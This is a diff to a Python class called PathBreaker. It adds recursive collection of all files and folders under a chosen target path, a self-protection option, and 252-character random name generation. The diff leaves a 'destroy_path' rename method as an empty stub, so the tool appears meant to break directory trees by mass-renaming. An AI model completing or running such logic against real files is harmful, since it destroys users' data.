@@ -6,11 +6,13 @@ import sys
 
 class PathBreaker:
 
-    def __init__(self, debug:bool=True):
+    def __init__(self, debug:bool=True, path_mode:int=3, autoprotect:bool=False):
         self.debug = debug
         self.program_format = self._exe_or_py()
-        self.program_path = self._get_script_path()
-        self.program_dir = os.path.dirname(self.program_path)
+        self.program_path = pathlib.Path(self._get_script_path()).resolve()
+        self.program_dir = self.program_path.parent
+        self.target_path = self._select_target(mode=path_mode)
+        self.autoprotect = autoprotect
 
     #==================
     # PRE CONFIG FUNC #
@@ -23,7 +25,7 @@ class PathBreaker:
             return 'exe'
         else:
             return 'py'
-        
+
     def _get_script_path(self):
         """
         Return the path of the program
@@ -66,7 +68,8 @@ class PathBreaker:
     #=================
     # NAME GENERATOR #
     #=================
-    def _gen_trash_name(length: int = 252):
+    @staticmethod
+    def _gen_random_name(length: int = 252):
         """Generate a random name
 
         Args:
@@ -77,16 +80,16 @@ class PathBreaker:
         """
         alphabet = string.ascii_letters + string.digits
         return ''.join(secrets.choice(alphabet) for _ in range(length))
-    
-    def gen_name(self, mode:int=1, name:str=None, tag:str=None, extension:str='exe', lenght:int=None):
+
+    def _gen_name(self, mode:int=1, name:str=None, tag:str=None, extension:str=None, length:int=None):
         """Generate the final name for file
 
         Args:
             mode (int, optional): Random(1) or Custom(2) mode. Defaults to 1.
             name (str, optional): Custom name for second mode. Defaults to None.
-            tag (str, optional): _description_. Defaults to None.
-            extension (str, optional): The extension for the full filename. Defaults to 'exe'.
-            lenght (int, optional): Lenght of the random name. Defaults to None (252 in the called func).
+            tag (str, optional): add a number (for add a counter). Defaults to None.
+            extension (str, optional): The extension for the full filename. Mark only for file usage. Defaults to 'None'.
+            length (int, optional): Lenght of the random name. Defaults to None (252 in the called func).
 
         Returns:
             name: A new name for rename the target 
@@ -96,12 +99,15 @@ class PathBreaker:
             tag = str(tag)
         else:
             tag = ''
+        # Extension management
+        if extension is None:
+            extension = ''
         # Random mode
         if mode == 1:
-            if lenght is None:
-                name = self._gen_trash_name()+tag+'.'+extension
+            if length is None:
+                name = self._gen_random_name()+tag+'.'+extension
             else:
-                name = self._gen_trash_name(length=lenght)+tag+'.'+extension            
+                name = self._gen_random_name(length=length)+tag+'.'+extension            
             return name
         # Custom mode
         elif mode == 2:
@@ -109,3 +115,30 @@ class PathBreaker:
                 name = "Noname"
             name = name+tag+'.'+extension
             return name
+
+    #======================
+    # COLLECT SYSTEM DATA #
+    #======================
+    def _collect_paths(self):
+        """Collect the folders and files of the target path
+
+        Returns:
+            list: Dirs and files
+        """
+        dirs, files = [], []
+        for entry in self.target_path.rglob("*"):
+            try:
+                entry.lstat()
+            except Exception:
+                continue
+            if self.autoprotect and entry.resolve() == self.program_path:
+                continue
+            (dirs if entry.is_dir() else files).append(entry)
+        return dirs, files
+
+    #=========
+    # RENAME #
+    #=========
+    def destroy_path(self):
+        # TODO logic of rename files and dirs
+        pass
